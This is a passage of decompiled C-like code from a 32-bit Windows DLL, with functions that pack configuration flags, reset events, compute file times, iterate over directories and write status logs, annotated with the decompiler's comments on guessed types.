  if ( *(_BYTE *)(dword_101842F4 + 368) )
    result |= 2u;
  if ( *(_BYTE *)(dword_101842F4 + 369) )
    result |= 4u;
  if ( *(_BYTE *)(dword_101842F4 + 370) )
    result |= 8u;
  if ( *(_BYTE *)(dword_101842F4 + 371) )
    result |= 0x10u;
  if ( *(_BYTE *)(dword_101842F4 + 372) )
    result |= 0x20u;
  if ( *(_BYTE *)(dword_101842F4 + 373) )
    result |= 0x40u;
  if ( *(_BYTE *)(dword_101842F4 + 374) )
    return result | 0x80;
  return result;
}
// 101842F4: using guessed type int dword_101842F4;

//----- (10029D4C) --------------------------------------------------------
int sub_10029D4C()
{
  int result; // eax

  result = *(_BYTE *)(dword_101842F4 + 300) != 0;
  if ( *(_BYTE *)(dword_101842F4 + 301) )
    result |= 2u;
  if ( *(_BYTE *)(dword_101842F4 + 302) )
    result |= 4u;
  if ( *(_BYTE *)(dword_101842F4 + 303) )
    result |= 8u;
  if ( *(_BYTE *)(dword_101842F4 + 304) )
    result |= 0x10u;
  if ( *(_BYTE *)(dword_101842F4 + 305) )
    result |= 0x20u;
  if ( *(_BYTE *)(dword_101842F4 + 306) )
    result |= 0x40u;
  if ( *(_BYTE *)(dword_101842F4 + 307) )
    result |= 0x80u;
  if ( *(_BYTE *)(dword_101842F4 + 308) )
    result |= 0x100u;
  if ( *(_BYTE *)(dword_101842F4 + 309) )
    result |= 0x200u;
  if ( *(_BYTE *)(dword_101842F4 + 310) )
    return result | 0x400;
  return result;
}
// 101842F4: using guessed type int dword_101842F4;

//----- (10029DD6) --------------------------------------------------------
int sub_10029DD6()
{
  int result; // eax

  result = *(_BYTE *)(dword_101842F4 + 311) != 0;
  if ( *(_BYTE *)(dword_101842F4 + 313) )
    result |= 2u;
  if ( *(_BYTE *)(dword_101842F4 + 314) )
    result |= 4u;
  if ( *(_BYTE *)(dword_101842F4 + 315) )
    result |= 0x40u;
  if ( *(_BYTE *)(dword_101842F4 + 316) )
    result |= 0x80u;
  if ( *(_BYTE *)(dword_101842F4 + 317) )
    result |= 0x100u;
  if ( *(_BYTE *)(dword_101842F4 + 318) )
    result |= 8u;
  if ( *(_BYTE *)(dword_101842F4 + 319) )
    result |= 0x10u;
  if ( *(_BYTE *)(dword_101842F4 + 320) )
    return result | 0x20;
  return result;
}
// 101842F4: using guessed type int dword_101842F4;

//----- (10029E46) --------------------------------------------------------
int sub_10029E46()
{
  sub_100147E7();
  if ( dword_1017A024 != 1 )
    return 1;
  sub_100147E7();
  if ( dword_1017A020 == 4 )
    return 1;
  sub_100147E7();
  if ( dword_1017A020 == 5 )
    return 1;
  if ( hEvent && hHandle && ResetEvent(hEvent) && ResetEvent(hHandle) )
    return 0;
  return 3;
}
// 1017A020: using guessed type int dword_1017A020;
// 1017A024: using guessed type int dword_1017A024;

//----- (10029EAA) --------------------------------------------------------
bool __usercall sub_10029EAA@<al>(__int32 a1@<eax>, int a2, int a3)
{
  void *v3; // ecx
  void *v4; // eax
  bool v5; // bl
  int v7; // [esp-8h] [ebp-3Ch] BYREF
  void *v8; // [esp-4h] [ebp-38h]
  int v9[3]; // [esp+10h] [ebp-24h] BYREF
  void *v10; // [esp+1Ch] [ebp-18h]
  void *v11; // [esp+24h] [ebp-10h]
  int v12; // [esp+30h] [ebp-4h]

  v12 = 0;
  sub_10029BC2(a1);
  sub_1000B1F3(0, (int)v9, 0);
  LOBYTE(v12) = 1;
  v8 = v3;
  v7 = (int)v3;
  v11 = &v7;
  sub_1000728E(&v7, 0);
  LOBYTE(v12) = 1;
  sub_1004F7E6((_DWORD *)dword_10182DE8, 6, (char)v10, v7, (int)v8);
  sub_1002FDF0(v9, a3);
  v8 = v10;
  v4 = (void *)sub_1000B4B8(v9);
  v5 = sub_10029F42(a2, v4, v8) != 0;
  LOBYTE(v12) = 0;
  sub_1000B3DF(v9);
  v12 = -1;
  sub_1000780D(&a3);
  return v5;
}
// 10029ED0: variable 'v3' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 10029EAA: using guessed type int var_24[3];

//----- (10029F42) --------------------------------------------------------
char __cdecl sub_10029F42(int a1, void *a2, void *a3)
{
  int v4; // edx
  volatile LONG *v5; // ecx
  volatile LONG *v6; // [esp-8h] [ebp-44h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-40h]
  int v8[9]; // [esp+14h] [ebp-28h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  if ( !a3 )
    return 1;
  if ( sub_1000D687(a1) && sub_1000D45C(0, v4, a1) != 42 )
  {
    if ( (dword_10193B30 & 1) == 0 )
    {
      dword_10193B30 |= 1u;
      v9 = 0;
      v7 = v5;
      v6 = v5;
      v8[5] = (int)&v6;
      sub_1000B964(&v6);
      LOBYTE(v9) = 0;
      sub_1000BA6E(-1, 0x40000000, dword_10183438, a1, 128, -1, (int)v6, v7);
      atexit(sub_100F3719);
      v9 = -1;
    }
    v9 = 2;
    sub_1000BBC2(dword_10183438);
    sub_1000B1F3(a3, (int)v8, a2);
    LOBYTE(v9) = 3;
    sub_1000C60A(dword_10183438, v8);
    LOBYTE(v9) = 2;
    sub_1000B3DF(v8);
    v9 = -1;
    return 1;
  }
  return 0;
}
// 10029F70: variable 'v4' is possibly undefined
// 10029F93: variable 'v5' is possibly undefined
// 10183438: using guessed type HANDLE dword_10183438[10];
// 10193B30: using guessed type int dword_10193B30;

//----- (1002A02D) --------------------------------------------------------
struct _FILETIME __cdecl sub_1002A02D(int a1)
{
  struct _FILETIME SystemTimeAsFileTime; // [esp+0h] [ebp-Ch] BYREF

  memset(&SystemTimeAsFileTime, 0, sizeof(SystemTimeAsFileTime));
  if ( a1 )
  {
    GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
    *(_QWORD *)&SystemTimeAsFileTime -= 864000000000i64 * a1;
  }
  else
  {
    SystemTimeAsFileTime.dwLowDateTime = 0;
    SystemTimeAsFileTime.dwHighDateTime = 0;
  }
  return SystemTimeAsFileTime;
}

//----- (1002A080) --------------------------------------------------------
void __usercall sub_1002A080(
        __int32 a1@<eax>,
        _DWORD *a2,
        _DWORD *a3,
        int a4,
        int a5,
        int a6,
        int a7,
        volatile LONG *lpAddend,
        _DWORD *a9)
{
  int v9; // ecx
  int v10; // esi
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  int v15; // eax
  volatile LONG *v16; // edi
  void (__thiscall **v17)(_DWORD *, int, int); // eax
  void (__thiscall **v18)(_DWORD *, int, int); // eax
  int v19; // ecx
  _DWORD *v20; // eax
  int v21; // [esp-Ch] [ebp-80h]
  int v22; // [esp-8h] [ebp-7Ch] BYREF
  int v23; // [esp-4h] [ebp-78h]
  _DWORD v24[9]; // [esp+10h] [ebp-64h] BYREF
  int v25[5]; // [esp+34h] [ebp-40h] BYREF
  int v26[2]; // [esp+48h] [ebp-2Ch] BYREF
  int v27[2]; // [esp+50h] [ebp-24h] BYREF
  int v28[2]; // [esp+58h] [ebp-1Ch] BYREF
  void *v29; // [esp+60h] [ebp-14h] BYREF
  int v30[3]; // [esp+64h] [ebp-10h] BYREF
  int v31; // [esp+70h] [ebp-4h]

  v31 = 3;
  sub_10029BC2(a1);
  v23 = v9;
  v22 = v9;
  v29 = &v22;
  sub_1000728E(&v22, 0);
  LOBYTE(v31) = 4;
  v10 = a7;
  v11 = sub_10029C4A(a7, v28);
  LOBYTE(v31) = 5;
  v21 = *(_DWORD *)(v10 + 28);
  LOBYTE(v31) = 6;
  sub_1004F466((_DWORD *)dword_10182DE8, 4, (int)v11, v21, v22, v23);
  LOBYTE(v31) = 3;
  sub_1000D3AD(v28);
  v30[0] = *(_DWORD *)(v10 + 28);
  if ( v30[0] == 1 || v30[0] == 2 )
  {
    sub_10030CA7(a3, 1000);
    if ( !*a2 && !sub_1002FB55(a2) )
    {
      sub_1000D17D(v28, &word_10178BF4);
      LOBYTE(v31) = 7;
      v23 = v19;
      v22 = v19;
      v29 = &v22;
      sub_1000728E(&v22, 0);
      LOBYTE(v31) = 7;
      sub_1004F292((_DWORD *)dword_10182DE8, 201, (int)v28, v22, v23);
      LOBYTE(v31) = 3;
      sub_1000D3AD(v28);
      v20 = sub_1000E7F7(&v29, 1, 0);
      LOBYTE(v31) = 9;
      v23 = 251;
      sub_10007882((int)v20);
    }
  }
  else
  {
    sub_10030CA7(a3, 200);
    sub_1001F430(a2, 0);
  }
  sub_10029CB4(v10, v26);
  LOBYTE(v31) = 10;
  sub_10029C4A(v10, v27);
  LOBYTE(v31) = 11;
  sub_1001AC1E((int)v24);
  LOBYTE(v31) = 12;
  v12 = (_DWORD *)sub_1000B1F3((void *)4, (int)v25, v30);
  LOBYTE(v31) = 13;
  sub_1001AD28(v24, v12);
  LOBYTE(v31) = 12;
  sub_1000B3DF(v25);
  v13 = (_DWORD *)sub_1000B261((int)v26, (int)v25, 1);
  LOBYTE(v31) = 14;
  sub_1001AD28(v24, v13);
  LOBYTE(v31) = 12;
  sub_1000B3DF(v25);
  v14 = (_DWORD *)sub_1000B261((int)v27, (int)v25, 1);
  LOBYTE(v31) = 15;
  sub_1001AD28(v24, v14);
  LOBYTE(v31) = 12;
  sub_1000B3DF(v25);
  v15 = sub_1001AD84(v24, (int)v25);
  LOBYTE(v31) = 16;
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)a5 + 4))(a5, v15, 91);
  LOBYTE(v31) = 12;
  sub_1000B3DF(v25);
  v16 = lpAddend;
  v29 = &v22;
  v23 = (int)lpAddend;
  v22 = v10;
  InterlockedIncrement(lpAddend);
  LOBYTE(v31) = 17;
  v17 = (void (__thiscall **)(_DWORD *, int, int))(*a3 + 16);
  LOBYTE(v31) = 12;
  (*v17)(a3, v22, v23);
  (*(void (__thiscall **)(_DWORD *))(*a3 + 24))(a3);
  v29 = &v22;
  v23 = (int)v16;
  v22 = v10;
  InterlockedIncrement(v16);
  LOBYTE(v31) = 18;
  v18 = (void (__thiscall **)(_DWORD *, int, int))(*a9 + 16);
  LOBYTE(v31) = 12;
  (*v18)(a9, v22, v23);
  LOBYTE(v31) = 11;
  sub_1001AC89((int)v24);
  LOBYTE(v31) = 10;
  sub_1000D3AD(v27);
  LOBYTE(v31) = 3;
  sub_1000D3AD(v26);
  LOBYTE(v31) = 2;
  sub_1003406C((void **)&a3);
  LOBYTE(v31) = 1;
  sub_1000780D(&a5);
  LOBYTE(v31) = 0;
  sub_1000780D(&a7);
  v31 = -1;
  sub_1003406C((void **)&a9);
}
// 1002A098: variable 'v9' is possibly undefined
// 1002A2B6: variable 'v19' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 1002A080: using guessed type int var_10[3];
// 1002A080: using guessed type _DWORD var_64[9];
// 1002A080: using guessed type int var_40[5];

//----- (1002A306) --------------------------------------------------------
_DWORD *__usercall sub_1002A306@<eax>(__int32 a1@<eax>, _DWORD *a2, void *a3, void *a4)
{
  int v4; // ecx
  _DWORD *v5; // eax
  int v6; // ecx
  _DWORD *v7; // eax
  _DWORD *v8; // ecx
  int v9; // eax
  LONG *v10; // eax
  _DWORD *v11; // eax
  int v12; // ecx
  int v13; // ecx
  int v14; // ecx
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  int v18; // [esp-Ch] [ebp-98h]
  int v19; // [esp-8h] [ebp-94h] BYREF
  int v20; // [esp-4h] [ebp-90h]
  _DWORD v21[4]; // [esp+10h] [ebp-7Ch] BYREF
  _DWORD v22[4]; // [esp+20h] [ebp-6Ch] BYREF
  _DWORD v23[4]; // [esp+30h] [ebp-5Ch] BYREF
  _DWORD v24[2]; // [esp+40h] [ebp-4Ch] BYREF
  int v25[2]; // [esp+48h] [ebp-44h] BYREF
  int v26[2]; // [esp+50h] [ebp-3Ch] BYREF
  _DWORD v27[2]; // [esp+58h] [ebp-34h] BYREF
  void *v28[2]; // [esp+60h] [ebp-2Ch] BYREF
  void *v29; // [esp+68h] [ebp-24h] BYREF
  int v30; // [esp+6Ch] [ebp-20h] BYREF
  int v31; // [esp+70h] [ebp-1Ch] BYREF
  void *Block; // [esp+74h] [ebp-18h]
  int v33; // [esp+78h] [ebp-14h]
  int v34; // [esp+88h] [ebp-4h]

  sub_10029BC2(a1);
  sub_1002AB9A(a2);
  v34 = 0;
  v33 = 1;
  sub_10057D8D(v27);
  v34 = 1;
  if ( !a3 )
  {
    v16 = sub_100346EC((__int32)v21, v21);
    LOBYTE(v34) = 2;
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(*a2 + 56))(a2, v16);
    LOBYTE(v34) = 1;
    v8 = v21;
LABEL_21:
    sub_1002987A(v8);
    goto LABEL_22;
  }
  if ( a3 == (void *)1 )
  {
    if ( !sub_1002FB55(v27) )
    {
      sub_1000D17D(v25, &word_10178BF8);
      LOBYTE(v34) = 3;
      v20 = v14;
      v19 = v14;
      sub_1000728E(&v19, 0);
      LOBYTE(v34) = 3;
      sub_1004F292((_DWORD *)dword_10182DE8, 201, (int)v25, v19, v20);
      LOBYTE(v34) = 1;
      sub_1000D3AD(v25);
      v5 = sub_1000E7F7(&v29, 1, 0);
      LOBYTE(v34) = 5;
      v20 = 296;
LABEL_6:
      sub_10007882((int)v5);
    }
    v15 = sub_1003471B((__int32)v22, v22);
    LOBYTE(v34) = 6;
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(*a2 + 56))(a2, v15);
    LOBYTE(v34) = 1;
    v8 = v22;
    goto LABEL_21;
  }
  if ( a3 != (void *)2 )
  {
    if ( a3 != (void *)3 )
    {
      v20 = v4;
      v19 = v4;
      Block = &v19;
      sub_1000728E(&v19, 0);
      LOBYTE(v34) = 1;
      sub_1004F7E6((_DWORD *)dword_10182DE8, 202, (char)a3, v19, v20);
      v5 = sub_1000E7F7(&v31, 1, 0);
      LOBYTE(v34) = 17;
      v20 = 330;
      goto LABEL_6;
    }
    if ( !sub_1002FB55(v27) )
    {
      sub_1000D17D(v26, &word_10178BFC);
      LOBYTE(v34) = 7;
      v20 = v6;
      v19 = v6;
      sub_1000728E(&v19, 0);
      LOBYTE(v34) = 7;
      sub_1004F292((_DWORD *)dword_10182DE8, 201, (int)v26, v19, v20);
      LOBYTE(v34) = 1;
      sub_1000D3AD(v26);
      v5 = sub_1000E7F7(&v30, 1, 0);
      LOBYTE(v34) = 9;
      v20 = 307;
      goto LABEL_6;
    }
    v7 = sub_1003474A(v23);
    LOBYTE(v34) = 10;
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(*a2 + 56))(a2, v7);
    LOBYTE(v34) = 1;
    v8 = v23;
    goto LABEL_21;
  }
  sub_100185CD(a4, (int)v28);
  LOBYTE(v34) = 11;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v28[0] + 4))(v28[0]) )
  {
    LOBYTE(v34) = 12;
    Block = operator new(0x20u);
    LOBYTE(v34) = 13;
    if ( Block )
    {
      v9 = (*(int (__thiscall **)(void *))(*(_DWORD *)v28[0] + 12))(v28[0]);
      v10 = sub_100343A3((LONG *)Block, v9);
    }
    else
    {
      v10 = 0;
    }
    LOBYTE(v34) = 12;
    v11 = sub_1000728E(v24, (int)v10);
    LOBYTE(v34) = 14;
    sub_10034F16(a2, (int)v11);
    LOBYTE(v34) = 12;
    sub_1000780D(v24);
    v34 = 11;
    sub_10021F56(v12, (int)v28[0]);
  }
  LOBYTE(v34) = 1;
  sub_10007D7A(v28);
LABEL_22:
  v20 = v13;
  v19 = v13;
  v29 = &v19;
  if ( a2[3] )
  {
    sub_1000728E(&v19, 0);
    LOBYTE(v34) = 18;
    v18 = a2[3];
    LOBYTE(v34) = 1;
    sub_1004F966((_DWORD *)dword_10182DE8, 1, (char)a3, v18, v19, v20);
  }
  else
  {
    sub_1000728E(&v19, 0);
    LOBYTE(v34) = 1;
    sub_1004F7E6((_DWORD *)dword_10182DE8, 112, (char)a3, v19, v20);
  }
  LOBYTE(v34) = 0;
  sub_10020B81(v27);
  return a2;
}
// 1002A35D: variable 'v4' is possibly undefined
// 1002A3BF: variable 'v6' is possibly undefined
// 1002A4B6: variable 'v12' is possibly undefined
// 1002A4F1: variable 'v14' is possibly undefined
// 1002A580: variable 'v13' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 1002A306: using guessed type _DWORD var_34[2];
// 1002A306: using guessed type _DWORD var_5C[4];
// 1002A306: using guessed type _DWORD var_4C[2];
// 1002A306: using guessed type _DWORD var_6C[4];
// 1002A306: using guessed type _DWORD var_7C[4];

//----- (1002A5E0) --------------------------------------------------------
_DWORD *__usercall sub_1002A5E0@<eax>(
        __int32 a1@<eax>,
        void **a2@<ebx>,
        _DWORD *a3,
        void *a4,
        _DWORD *a5,
        _DWORD *a6,
        _DWORD *a7,
        wchar_t *a8)
{
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  void *v10; // esi
  _DWORD *v11; // eax
  _DWORD *v12; // esi
  void *v13; // ecx
  int v14; // ecx
  _DWORD *v15; // eax
  int v17; // [esp-28h] [ebp-68h]
  bool v18; // [esp-1Ch] [ebp-5Ch]
  int v19; // [esp-18h] [ebp-58h] BYREF
  int v20; // [esp-14h] [ebp-54h]
  _DWORD *v21; // [esp-10h] [ebp-50h] BYREF
  wchar_t *v22; // [esp-Ch] [ebp-4Ch]
  void *v23; // [esp-8h] [ebp-48h] BYREF
  volatile LONG *v24; // [esp-4h] [ebp-44h]
  int v25[2]; // [esp+10h] [ebp-30h] BYREF
  int v26; // [esp+18h] [ebp-28h] BYREF
  volatile LONG *lpAddend; // [esp+1Ch] [ebp-24h]
  void *v28; // [esp+20h] [ebp-20h]
  void *v29; // [esp+24h] [ebp-1Ch]
  int v30; // [esp+28h] [ebp-18h]
  void *Block; // [esp+2Ch] [ebp-14h]
  void *v32; // [esp+30h] [ebp-10h]
  int v33; // [esp+3Ch] [ebp-4h]

  v30 = 0;
  v33 = 2;
  sub_10029BC2(a1);
  v8 = operator new(0x30Cu);
  Block = v8;
  if ( v8 )
    v9 = sub_1001E85D(v8);
  else
    v9 = 0;
  LOBYTE(v33) = 1;
  sub_10039112(&v26, (int)v9);
  LOBYTE(v33) = 3;
  sub_10012E21(v25, a4, 1);
  LOBYTE(v33) = 4;
  v10 = (void *)v26;
  sub_1001E967(v26, (int)v25);
  Block = operator new(0x74u);
  LOBYTE(v33) = 5;
  if ( Block )
  {
    v32 = &v23;
    v24 = lpAddend;
    v23 = v10;
    InterlockedIncrement(lpAddend);
    LOBYTE(v33) = 6;
    v22 = *(wchar_t **)(dword_101842F4 + 36);
    v21 = a6;
    v20 = *(_DWORD *)(dword_101842F4 + 32);
    LOBYTE(v33) = 5;
    v32 = (void *)sub_100314BB((int)Block, dword_101842F4 + 24, v20, (char)a6, (int)v22, v23, v24);
  }
  else
  {
    v32 = 0;
  }
  LOBYTE(v33) = 4;
  if ( *a2 != v32 )
  {
    sub_100081D1((int)a2);
    v11 = operator new(4u);
    Block = v11;
    LOBYTE(v33) = 7;
    if ( v11 )
      *v11 = 1;
    else
      v11 = 0;
    LOBYTE(v33) = 4;
    a2[1] = v11;
    *a2 = v32;
  }
  Block = operator new(0x308u);
  LOBYTE(v33) = 8;
  v12 = 0;
  if ( Block )
  {
    v23 = (void *)v24;
    v24 = (volatile LONG *)a2[1];
    v13 = *a2;
    v32 = &v23;
    v23 = v13;
    InterlockedIncrement(v24);
    LOBYTE(v33) = 9;
    v29 = &v21;
    v22 = a8;
    v21 = a7;
    InterlockedIncrement((volatile LONG *)a8);
    LOBYTE(v33) = 10;
    v20 = v14;
    v19 = v14;
    v28 = &v19;
    sub_1000D372(&v19, dword_101842F4 + 8);
    LOBYTE(v33) = 11;
    v18 = *(_DWORD *)(dword_101842F4 + 52) == 0;
    v17 = *(_DWORD *)(dword_101842F4 + 48);
    LOBYTE(v33) = 8;
    v12 = sub_100352B2(Block, v17, (int)hEvent, a5, v18, v19, v20, v21, v22, (int)v23, v24);
  }
  LOBYTE(v33) = 4;
  v15 = operator new(4u);
  v28 = v15;
  LOBYTE(v33) = 12;
  if ( v15 )
    *v15 = 1;
  else
    v15 = 0;
  a3[1] = v15;
  *a3 = v12;
  v30 = 1;
  LOBYTE(v33) = 3;
  sub_10012E7E(v25);
  LOBYTE(v33) = 1;
  sub_1003406C((void **)&v26);
  LOBYTE(v33) = 0;
  sub_1000780D(&a7);
  return a3;
}
// 1002A72F: variable 'v14' is possibly undefined
// 101842F4: using guessed type int dword_101842F4;

//----- (1002A7CB) --------------------------------------------------------
int *__cdecl sub_1002A7CB(
        int *a1,
        int a2,
        unsigned int a3,
        _DWORD *a4,
        volatile LONG *a5,
        int a6,
        int a7,
        int a8,
        int a9,
        __int64 a10,
        int a11,
        volatile LONG *lpAddend,
        int a13,
        int a14)
{
  _DWORD *v14; // eax
  _DWORD *v15; // ebx
  int v16; // ecx
  int *v17; // eax
  volatile LONG *v18; // ecx
  int v19; // ecx
  _DWORD *v20; // eax
  BOOL IsDirectoryW; // eax
  struct _FILETIME v22; // rax
  int v23; // esi
  __int32 v24; // eax
  int v25; // ecx
  int v26; // ecx
  _DWORD *v28; // [esp-20h] [ebp-A4h] BYREF
  volatile LONG *v29; // [esp-1Ch] [ebp-A0h]
  int v30; // [esp-18h] [ebp-9Ch] BYREF
  int v31; // [esp-14h] [ebp-98h] BYREF
  volatile LONG *v32; // [esp-10h] [ebp-94h] BYREF
  volatile LONG *v33; // [esp-Ch] [ebp-90h]
  _QWORD v34[3]; // [esp-8h] [ebp-8Ch] BYREF
  int v35[7]; // [esp+10h] [ebp-74h] BYREF
  int v36[2]; // [esp+34h] [ebp-50h] BYREF
  int v37[2]; // [esp+3Ch] [ebp-48h] BYREF
  int v38; // [esp+44h] [ebp-40h] BYREF
  volatile LONG *v39; // [esp+48h] [ebp-3Ch]
  void *v40[2]; // [esp+4Ch] [ebp-38h] BYREF
  void *v41; // [esp+54h] [ebp-30h]
  void *v42; // [esp+58h] [ebp-2Ch]
  void *v43; // [esp+5Ch] [ebp-28h]
  void *v44; // [esp+60h] [ebp-24h]
  unsigned int v45; // [esp+64h] [ebp-20h]
  int v46; // [esp+68h] [ebp-1Ch]
  int v47; // [esp+6Ch] [ebp-18h]
  char v48; // [esp+73h] [ebp-11h]
  int v49; // [esp+80h] [ebp-4h]

  v46 = 0;
  v49 = 3;
  sub_1000132C(v35);
  sub_10037CF0(&a6, (int)v40);
  LOBYTE(v49) = 4;
  v45 = 0;
  v14 = sub_10057D8D(v37);
  LOBYTE(v49) = 5;
  sub_10029BC2((__int32)v14);
  v47 = (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v40[0] + 4))(v40[0]) != 0 ? 2 : 0;
  v15 = a4;
  while ( v45 < a3 && !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v40[0] + 4))(v40[0]) && !v47 )
  {
    HIDWORD(v34[0]) = v16;
    LODWORD(v34[0]) = v16;
    v44 = v34;
    sub_1000728E(v34, 0);
    LOBYTE(v49) = 5;
    sub_1004F7E6((_DWORD *)dword_10182DE8, 5, v45 + 1, v34[0], SHIDWORD(v34[0]));
    while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v40[0] + 4))(v40[0]) )
    {
      v17 = (int *)(*(int (__thiscall **)(void *))(*(_DWORD *)v40[0] + 12))(v40[0]);
      v39 = (volatile LONG *)v17[1];
      v38 = *v17;
      InterlockedIncrement(v39);
      LOBYTE(v49) = 8;
      v44 = v34;
      v34[0] = a10;
      InterlockedIncrement((volatile LONG *)HIDWORD(a10));
      LOBYTE(v49) = 9;
      v33 = v18;
      v32 = v18;
      v43 = &v32;
      sub_10011AE0(&v38, &v32);
      LOBYTE(v49) = 10;
      v31 = v19;
      v30 = v19;
      v42 = &v30;
      sub_1000A205(&a11, &v30);
      LOBYTE(v49) = 11;
      v41 = &v28;
      v29 = a5;
      v28 = v15;
      InterlockedIncrement(a5);
      LOBYTE(v49) = 8;
      sub_1002A080((__int32)v37, v37, v28, (int)v29, v30, v31, (int)v32, v33, (_DWORD *)v34[0]);
      v47 = (*(int (__thiscall **)(_DWORD *))(*v15 + 8))(v15);
      if ( *(_DWORD *)(v38 + 28) == 3
        || (v20 = sub_10029C7F(v38, v36),
            LOBYTE(v49) = 13,
            v46 |= 1u,
            IsDirectoryW = PathIsDirectoryW(*(LPCWSTR *)(v20[1] + 12)),
            v48 = 1,
            !IsDirectoryW) )
      {
        v48 = 0;
      }
      v49 = 8;
      if ( (v46 & 1) != 0 )
      {
        v46 &= ~1u;
        sub_1000D3AD(v36);
      }
      if ( v48 )
      {
        v22 = sub_1001C711();
        v23 = *v15;
        v34[0] = v22;
        LOBYTE(v22.dwLowDateTime) = v47 != 2;
        (*(void (__thiscall **)(_DWORD *, DWORD, _DWORD, DWORD))(v23 + 32))(
          v15,
          v22.dwLowDateTime,
          v34[0],
          v22.dwHighDateTime);
      }
      if ( v47 != 2 )
      {
        LOBYTE(v49) = 5;
        sub_1000780D(&v38);
        LOBYTE(v49) = 5;
        break;
      }
      v49 = 5;
      sub_1000780D(&v38);
      sub_10042AAB((int)v40[0]);
    }
    v41 = &v31;
    v32 = lpAddend;
    v31 = a11;
    v24 = InterlockedIncrement(lpAddend);
    LOBYTE(v49) = 5;
    if ( !sub_10029EAA(v24, a2, v31) )
    {
      v35[0] = 7;
      goto LABEL_29;
    }
    ++v45;
  }
  if ( v47 == 3 )
  {
    sub_1000D17D(&v38, &word_10178C00);
    LOBYTE(v49) = 19;
    HIDWORD(v34[0]) = v25;
    LODWORD(v34[0]) = v25;
    v41 = v34;
    sub_1000728E(v34, 0);
    LOBYTE(v49) = 19;
    sub_1004F292((_DWORD *)dword_10182DE8, 200, (int)&v38, v34[0], SHIDWORD(v34[0]));
    LOBYTE(v49) = 5;
    sub_1000D3AD(&v38);
    v35[0] = 10;
  }
  else
  {
    if ( v47 == 2 )
    {
      sub_1000D17D(&v38, &word_10178C04);
      LOBYTE(v49) = 21;
      HIDWORD(v34[0]) = v26;
      LODWORD(v34[0]) = v26;
      v41 = v34;
      sub_1000728E(v34, 0);
      LOBYTE(v49) = 21;
      sub_1004F292((_DWORD *)dword_10182DE8, 7, (int)&v38, v34[0], SHIDWORD(v34[0]));
      LOBYTE(v49) = 5;
      sub_1000D3AD(&v38);
    }
    v35[0] = 0;
  }
  LOBYTE(v35[2]) = v47 == 4;
  if ( v47 || (BYTE1(v35[2]) = 1, v45 < a3) )
    BYTE1(v35[2]) = 0;
  BYTE2(v35[2]) = v47 == 2;
  *(int *)((char *)&v35[2] + 3) = a13;
  *(int *)((char *)&v35[3] + 3) = a14;
  *(_QWORD *)((char *)&v35[4] + 3) = qword_10176838;
LABEL_29:
  qmemcpy(a1, v35, 0x1Cu);
  LOBYTE(v49) = 4;
  sub_10020B81(v37);
  LOBYTE(v49) = 3;
  sub_1003406C(v40);
  LOBYTE(v49) = 2;
  sub_1003406C((void **)&a4);
  LOBYTE(v49) = 1;
  sub_1002987A(&a6);
  LOBYTE(v49) = 0;
  sub_1003406C((void **)&a10);
  v49 = -1;
  sub_1000780D(&a11);
  return a1;
}
// 1002A850: variable 'v16' is possibly undefined
// 1002A8C1: variable 'v18' is possibly undefined
// 1002A8D4: variable 'v19' is possibly undefined
// 1002AA6A: variable 'v25' is possibly undefined
// 1002AAC1: variable 'v26' is possibly undefined
// 10176838: using guessed type __int64 qword_10176838;
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1002AB9A) --------------------------------------------------------
_DWORD *__stdcall sub_1002AB9A(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_100FBF5C;
  *a1 = &off_10103158;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103158: using guessed type int (__thiscall *off_10103158)(void *Block, char);

//----- (1002ABD3) --------------------------------------------------------
_DWORD *__stdcall sub_1002ABD3(_DWORD *a1)
{
  sub_100288A3((int)a1);
  *a1 = &off_10103238;
  return a1;
}
// 10103238: using guessed type int (__thiscall *off_10103238)(void *Block, char);

//----- (1002AC00) --------------------------------------------------------
void __thiscall sub_1002AC00(_DWORD *this)
{
  *this = &off_10103238;
  sub_100288F3(this);
}
// 10103238: using guessed type int (__thiscall *off_10103238)(void *Block, char);

//----- (1002AC24) --------------------------------------------------------
_DWORD *__thiscall sub_1002AC24(_DWORD *Block, char a2)
{
  sub_1002AC00(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002AC40) --------------------------------------------------------
void __thiscall sub_1002AC40(int *this)
{
  *this = (int)&off_10103248;
  sub_1000D3AD(this + 190);
  sub_1002AC92((int)this);
}
// 10103248: using guessed type int (__thiscall *off_10103248)(void *Block, char);

//----- (1002AC76) --------------------------------------------------------
int *__thiscall sub_1002AC76(int *Block, char a2)
{
  sub_1002AC40(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002AC92) --------------------------------------------------------
void __stdcall sub_1002AC92(int a1)
{
  sub_1000D3AD((int *)(a1 + 752));
  sub_10035E78(a1);
}

//----- (1002ACC3) --------------------------------------------------------
void __thiscall sub_1002ACC3(int *this)
{
  *this = (int)&off_1010326C;
  sub_1000B3DF(this + 193);
  sub_1002AC40(this);
}
// 1010326C: using guessed type int (__thiscall *off_1010326C)(void *Block, char);

//----- (1002ACFA) --------------------------------------------------------
int *__thiscall sub_1002ACFA(int *Block, char a2)
{
  sub_1002ACC3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002AD16) --------------------------------------------------------
void __cdecl sub_1002AD16(int *a1)
{
  void *v1; // eax
  int v2; // edx
  int v3; // eax
